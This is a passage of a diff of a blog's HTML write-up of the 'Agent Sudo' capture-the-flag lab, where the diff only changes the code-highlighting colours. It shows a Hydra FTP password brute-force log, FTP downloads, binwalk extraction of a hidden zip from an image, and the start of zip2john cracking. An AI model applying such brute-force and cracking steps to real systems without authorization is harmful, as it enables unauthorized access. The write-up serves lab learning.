+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;banana&#34;</span> - <span style="color:#bd93f9">245</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;prince&#34;</span> - <span style="color:#bd93f9">246</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>STATUS<span style="color:#ff79c6">]</span> 7.94 tries/min, <span style="color:#bd93f9">246</span> tries in 00:31h, <span style="color:#bd93f9">14344155</span> to <span style="color:#ff79c6">do</span> in 30126:37h, <span style="color:#bd93f9">1</span> active
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;friend&#34;</span> - <span style="color:#bd93f9">247</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;jesus1&#34;</span> - <span style="color:#bd93f9">248</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;------l&#34;</span> - <span style="color:#bd93f9">249</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>21<span style="color:#ff79c6">][</span>ftp<span style="color:#ff79c6">]</span> host: 10.10.73.189   login: ----s   password: ------l
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>STATUS<span style="color:#ff79c6">]</span> attack finished <span style="color:#ff79c6">for</span> 10.10.73.189 <span style="color:#ff79c6">(</span>waiting <span style="color:#ff79c6">for</span> children to <span style="color:#8be9fd;font-style:italic">complete</span> tests<span style="color:#ff79c6">)</span>
 </span></span></code></pre></div><p>We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ ftp 10.10.73.189 
 </span></span><span style="display:flex;"><span>Connected to 10.10.73.189.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">220</span> <span style="color:#000">(</span>vsFTPd 3.0.3<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Name <span style="color:#000">(</span>10.10.73.189:virtualtack<span style="color:#000">)</span>: ----s
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">220</span> <span style="color:#ff79c6">(</span>vsFTPd 3.0.3<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#ff79c6">(</span>10.10.73.189:virtualtack<span style="color:#ff79c6">)</span>: ----s
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">331</span> Please specify the password.
 </span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">230</span> Login successful.
-</span></span><span style="display:flex;"><span>Remote system <span style="color:#a90d91">type</span> is UNIX.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
 </span></span><span style="display:flex;"><span>Using binary mode to transfer files.
 </span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|20720|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Here comes the directory listing.
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>             <span style="color:#1c01ce">217</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> To_agentJ.txt
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">33143</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cute-alien.jpg
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">34842</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cutie.png
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">229</span> Entering Extended Passive Mode <span style="color:#ff79c6">(||</span>|20720|<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>             <span style="color:#bd93f9">217</span> Oct <span style="color:#bd93f9">29</span>  <span style="color:#bd93f9">2019</span> To_agentJ.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>           <span style="color:#bd93f9">33143</span> Oct <span style="color:#bd93f9">29</span>  <span style="color:#bd93f9">2019</span> cute-alien.jpg
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>           <span style="color:#bd93f9">34842</span> Oct <span style="color:#bd93f9">29</span>  <span style="color:#bd93f9">2019</span> cutie.png
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">226</span> Directory send OK.
 </span></span><span style="display:flex;"><span>ftp&gt; get To_agentJ.txt
 </span></span><span style="display:flex;"><span>local: To_agentJ.txt remote: To_agentJ.txt
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|35196|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Opening BINARY mode data connection <span style="color:#a90d91">for</span> To_agentJ.txt <span style="color:#000">(</span><span style="color:#1c01ce">217</span> bytes<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>100% |************|   <span style="color:#1c01ce">217</span>       75.79 KiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">217</span> bytes received in 00:00 <span style="color:#000">(</span>1.69 KiB/s<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>ftp&gt; <span style="color:#a90d91">exit</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">221</span> Goodbye.                                                    
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">229</span> Entering Extended Passive Mode <span style="color:#ff79c6">(||</span>|35196|<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">150</span> Opening BINARY mode data connection <span style="color:#ff79c6">for</span> To_agentJ.txt <span style="color:#ff79c6">(</span><span style="color:#bd93f9">217</span> bytes<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>100% |************|   <span style="color:#bd93f9">217</span>       75.79 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">217</span> bytes received in 00:00 <span style="color:#ff79c6">(</span>1.69 KiB/s<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>ftp&gt; <span style="color:#8be9fd;font-style:italic">exit</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">221</span> Goodbye.                                                    
 </span></span></code></pre></div><p><code>To_agentJ.txt</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Dear agent J,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Dear agent J,
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn<span style="color:#000">&#39;</span>t be a problem <span style="color:#a90d91">for</span> you.
+</span></span><span style="display:flex;"><span>All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn&#39;t be a problem <span style="color:#ff79c6">for</span> you.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>From,
 </span></span><span style="display:flex;"><span>Agent C
 </span></span></code></pre></div><p>Good to know! Let&rsquo;s grab the image files and figure out how to extract Agent J&rsquo;s login password.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ ftp 10.10.73.189 
 </span></span><span style="display:flex;"><span>Connected to 10.10.73.189.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">220</span> <span style="color:#000">(</span>vsFTPd 3.0.3<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Name <span style="color:#000">(</span>10.10.73.189:virtualtack<span style="color:#000">)</span>: ----s
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">220</span> <span style="color:#ff79c6">(</span>vsFTPd 3.0.3<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>Name <span style="color:#ff79c6">(</span>10.10.73.189:virtualtack<span style="color:#ff79c6">)</span>: ----s
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">331</span> Please specify the password.
 </span></span><span style="display:flex;"><span>Password: 
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">230</span> Login successful.
-</span></span><span style="display:flex;"><span>Remote system <span style="color:#a90d91">type</span> is UNIX.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">230</span> Login successful.
+</span></span><span style="display:flex;"><span>Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
 </span></span><span style="display:flex;"><span>Using binary mode to transfer files.
 </span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|27749|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Here comes the directory listing.
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>             <span style="color:#1c01ce">217</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> To_agentJ.txt
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">33143</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cute-alien.jpg
-</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#1c01ce">1</span> <span style="color:#1c01ce">0</span>        <span style="color:#1c01ce">0</span>           <span style="color:#1c01ce">34842</span> Oct <span style="color:#1c01ce">29</span>  <span style="color:#1c01ce">2019</span> cutie.png
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Directory send OK.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">229</span> Entering Extended Passive Mode <span style="color:#ff79c6">(||</span>|27749|<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">150</span> Here comes the directory listing.
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>             <span style="color:#bd93f9">217</span> Oct <span style="color:#bd93f9">29</span>  <span style="color:#bd93f9">2019</span> To_agentJ.txt
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>           <span style="color:#bd93f9">33143</span> Oct <span style="color:#bd93f9">29</span>  <span style="color:#bd93f9">2019</span> cute-alien.jpg
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>           <span style="color:#bd93f9">34842</span> Oct <span style="color:#bd93f9">29</span>  <span style="color:#bd93f9">2019</span> cutie.png
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">226</span> Directory send OK.
 </span></span><span style="display:flex;"><span>ftp&gt; get cute-alien.jpg
 </span></span><span style="display:flex;"><span>local: cute-alien.jpg remote: cute-alien.jpg
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|13011|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Opening BINARY mode data connection <span style="color:#a90d91">for</span> cute-alien.jpg <span style="color:#000">(</span><span style="color:#1c01ce">33143</span> bytes<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>100% |************| <span style="color:#1c01ce">33143</span>      308.57 KiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">33143</span> bytes received in 00:00 <span style="color:#000">(</span>154.69 KiB/s<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">229</span> Entering Extended Passive Mode <span style="color:#ff79c6">(||</span>|13011|<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">150</span> Opening BINARY mode data connection <span style="color:#ff79c6">for</span> cute-alien.jpg <span style="color:#ff79c6">(</span><span style="color:#bd93f9">33143</span> bytes<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>100% |************| <span style="color:#bd93f9">33143</span>      308.57 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">33143</span> bytes received in 00:00 <span style="color:#ff79c6">(</span>154.69 KiB/s<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>ftp&gt; get cutie.png
 </span></span><span style="display:flex;"><span>local: cutie.png remote: cutie.png
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">229</span> Entering Extended Passive Mode <span style="color:#000">(||</span>|63920|<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">150</span> Opening BINARY mode data connection <span style="color:#a90d91">for</span> cutie.png <span style="color:#000">(</span><span style="color:#1c01ce">34842</span> bytes<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>100% |************| <span style="color:#1c01ce">34842</span>      322.63 KiB/s    00:00 ETA
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">226</span> Transfer complete.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">34842</span> bytes received in 00:00 <span style="color:#000">(</span>158.37 KiB/s<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">229</span> Entering Extended Passive Mode <span style="color:#ff79c6">(||</span>|63920|<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">150</span> Opening BINARY mode data connection <span style="color:#ff79c6">for</span> cutie.png <span style="color:#ff79c6">(</span><span style="color:#bd93f9">34842</span> bytes<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>100% |************| <span style="color:#bd93f9">34842</span>      322.63 KiB/s    00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">226</span> Transfer complete.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">34842</span> bytes received in 00:00 <span style="color:#ff79c6">(</span>158.37 KiB/s<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>ftp&gt; quit
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">221</span> Goodbye.
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">221</span> Goodbye.
 </span></span></code></pre></div><p>I should have used <code>mget *</code> here instead. Looking at the two images, I don&rsquo;t see anything immediately interesting. They are cute, though.</p>
 <p>I spent a while viewing the files but don&rsquo;t get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file <a href="https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/">you can do this with binaries, too</a>. Apparently everyone on the internet uses <code>binwalk</code> for this scenario. <a href="https://www.kali.org/tools/binwalk/">Binwalk</a> is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.</p>
 <p>Let&rsquo;s binwalk&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ binwalk cutie.png
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>DECIMAL       HEXADECIMAL     DESCRIPTION
 </span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">0</span>             0x0             PNG image, <span style="color:#1c01ce">528</span> x 528, 8-bit colormap, non-interlaced
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">869</span>           0x365           Zlib compressed data, best compression
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">34820</span>         0x8804          End of Zip archive, footer length: <span style="color:#1c01ce">22</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0</span>             0x0             PNG image, <span style="color:#bd93f9">528</span> x 528, 8-bit colormap, non-interlaced
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">869</span>           0x365           Zlib compressed data, best compression
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">34562</span>         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">34820</span>         0x8804          End of Zip archive, footer length: <span style="color:#bd93f9">22</span>
 </span></span></code></pre></div><p><code>binwalk</code>, in its omnipotence, has a function to extract known file types, using the <code>-e</code> flag.</p>
 <p>We also now have the extracted contents of <code>cutie.png</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">365</span>  365.zlib  8702.zip  To_agentR.txt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">365</span>  365.zlib  8702.zip  To_agentR.txt
 </span></span></code></pre></div><p>Let&rsquo;s unzip the archive:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ 7z x 8702.zip
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>7-Zip <span style="color:#000">[</span>64<span style="color:#000">]</span> 16.02 : Copyright <span style="color:#000">(</span>c<span style="color:#000">)</span> 1999-2016 Igor Pavlov : 2016-05-21
-</span></span><span style="display:flex;"><span>p7zip Version 16.02 <span style="color:#000">(</span><span style="color:#000">locale</span><span style="color:#000">=</span>en_US.UTF-8,Utf16<span style="color:#000">=</span>on,HugeFiles<span style="color:#000">=</span>on,64 bits,4 CPUs Intel<span style="color:#000">(</span>R<span style="color:#000">)</span> Core<span style="color:#000">(</span>TM<span style="color:#000">)</span> i7-7700K CPU @ 4.20GHz <span style="color:#000">(</span>906E9<span style="color:#000">)</span>,ASM,AES-NI<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>7-Zip <span style="color:#ff79c6">[</span>64<span style="color:#ff79c6">]</span> 16.02 : Copyright <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span style="display:flex;"><span>p7zip Version 16.02 <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">locale</span><span style="color:#ff79c6">=</span>en_US.UTF-8,Utf16<span style="color:#ff79c6">=</span>on,HugeFiles<span style="color:#ff79c6">=</span>on,64 bits,4 CPUs Intel<span style="color:#ff79c6">(</span>R<span style="color:#ff79c6">)</span> Core<span style="color:#ff79c6">(</span>TM<span style="color:#ff79c6">)</span> i7-7700K CPU @ 4.20GHz <span style="color:#ff79c6">(</span>906E9<span style="color:#ff79c6">)</span>,ASM,AES-NI<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Scanning the drive <span style="color:#a90d91">for</span> archives:
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">1</span> file, <span style="color:#1c01ce">280</span> bytes <span style="color:#000">(</span><span style="color:#1c01ce">1</span> KiB<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Scanning the drive <span style="color:#ff79c6">for</span> archives:
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span> file, <span style="color:#bd93f9">280</span> bytes <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> KiB<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Extracting archive: 8702.zip
 </span></span><span style="display:flex;"><span>--
-</span></span><span style="display:flex;"><span><span style="color:#000">Path</span> <span style="color:#000">=</span> 8702.zip
-</span></span><span style="display:flex;"><span><span style="color:#000">Type</span> <span style="color:#000">=</span> zip
-</span></span><span style="display:flex;"><span>Physical <span style="color:#000">Size</span> <span style="color:#000">=</span> <span style="color:#1c01ce">280</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Path</span> <span style="color:#ff79c6">=</span> 8702.zip
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">Type</span> <span style="color:#ff79c6">=</span> zip
+</span></span><span style="display:flex;"><span>Physical <span style="color:#8be9fd;font-style:italic">Size</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">280</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>Enter password <span style="color:#000">(</span>will not be echoed<span style="color:#000">)</span>:
+</span></span><span style="display:flex;"><span>Enter password <span style="color:#ff79c6">(</span>will not be echoed<span style="color:#ff79c6">)</span>:
 </span></span><span style="display:flex;"><span>ERROR: Wrong password : To_agentR.txt
 </span></span><span style="display:flex;"><span>                    
-</span></span><span style="display:flex;"><span>Sub items Errors: <span style="color:#1c01ce">1</span>
+</span></span><span style="display:flex;"><span>Sub items Errors: <span style="color:#bd93f9">1</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Archives with Errors: <span style="color:#1c01ce">1</span>
+</span></span><span style="display:flex;"><span>Archives with Errors: <span style="color:#bd93f9">1</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Sub items Errors: <span style="color:#1c01ce">1</span>
+</span></span><span style="display:flex;"><span>Sub items Errors: <span style="color:#bd93f9">1</span>
 </span></span></code></pre></div><p>Usually <code>zip</code> passwords are pretty easy to break in CTFs. Let&rsquo;s see if that&rsquo;s true here:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
 </span></span><span style="display:flex;"><span>└─$ zip2john 8702.zip &gt; 4john
 </span></span><span style="display:flex;"><span>                                                                    
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo/_cutie.png.extracted<span style="color:#ff79c6">]</span>
